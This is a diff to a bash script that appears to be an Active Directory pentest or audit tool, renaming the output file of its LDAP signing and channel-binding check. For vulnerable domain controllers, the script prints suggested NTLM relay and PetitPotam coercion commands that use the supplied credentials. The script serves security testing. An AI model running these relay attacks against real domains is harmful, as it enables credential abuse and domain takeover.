@@ -362,8 +362,6 @@ if [ ! -z "$CERTIPY_CMD" ]; then
         # ESC8 Exploitation Commands
         if [[ "${GROUPED[$name]}" =~ ESC8 ]]; then
           ESC8_CA_HOST=$(echo "$name" | sed 's/CA://')
-          
-          # Extract DNS Name from Certipy output
           ESC8_CA_DNS=$(awk -v ca="$ESC8_CA_HOST" '
             /CA Name\s*:/ { if ($NF == ca) found=1 }
             found && /DNS Name\s*:/ { print $NF; exit }
@@ -800,7 +798,7 @@ fi
 
 # LDAP Signing & LDAPS Channel Binding
 if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
-  echo "DC,IP,LDAP_Signing,Channel_Binding" > "$OUTPUT_DIR/ldap_security_check.csv"
+  echo "DC,IP,LDAP_Signing,Channel_Binding" > "$OUTPUT_DIR/ldapsign_channelbind.txt"
   VULN_DCS=""
   VULN_COUNT=0
   while IFS=: read -r hostname ip; do
@@ -808,9 +806,9 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
     signing=$(echo "$result" | grep -oP 'signing:\K\w+')
     cb=$(echo "$result" | grep -oP 'channel binding:\K\S+')
     if [ -z "$signing" ]; then
-      echo "$hostname,$ip,TIMEOUT,TIMEOUT" >> "$OUTPUT_DIR/ldap_security_check.csv"
+      echo "$hostname,$ip,TIMEOUT,TIMEOUT" >> "$OUTPUT_DIR/ldapsign_channelbind.txt"
     else
-      echo "$hostname,$ip,$signing,$cb" >> "$OUTPUT_DIR/ldap_security_check.csv"
+      echo "$hostname,$ip,$signing,$cb" >> "$OUTPUT_DIR/ldapsign_channelbind.txt"
       if [ "$signing" = "None" ] && [[ "$cb" =~ ^(No|Never) ]]; then
         VULN_COUNT=$((VULN_COUNT + 1))
         VULN_DCS="${VULN_DCS}${RED}       └─ ${hostname} (${ip})${NC}\n"
@@ -820,12 +818,12 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
   if [ $VULN_COUNT -gt 0 ]; then
     LDAP_SIGNING_VULN=1 
     if [ $VULN_COUNT -eq $DC_COUNT ]; then
-      echo -e "${RED}[KO] All $DC_COUNT DCs: LDAP Signing + LDAPS Channel Binding NOT enforced → ldap_security_check.csv${NC}"
+      echo -e "${RED}[KO] All $DC_COUNT DCs: LDAP Signing + LDAPS Channel Binding NOT enforced → ldapsign_channelbind.txt${NC}"
     else
-      echo -e "${RED}[KO] $VULN_COUNT/$DC_COUNT DC(s) without LDAP Signing + LDAPS Channel Binding → ldap_security_check.csv${NC}"
+      echo -e "${RED}[KO] $VULN_COUNT/$DC_COUNT DC(s) without LDAP Signing + LDAPS Channel Binding → ldapsign_channelbind.txt${NC}"
       printf "$VULN_DCS"
     fi
-    FIRST_VULN_LDAP_DC_IP=$(awk -F',' 'NR==2 {print $2}' "$OUTPUT_DIR/ldap_security_check.csv")
+    FIRST_VULN_LDAP_DC_IP=$(awk -F',' 'NR==2 {print $2}' "$OUTPUT_DIR/ldapsign_channelbind.txt")
     if [ "$RELAY_COUNT" -gt 0 ]; then
       echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${FIRST_VULN_LDAP_DC_IP} --remove-mic --delegate-access${NC}"
       echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_LDAP_DC_IP}${NC}"
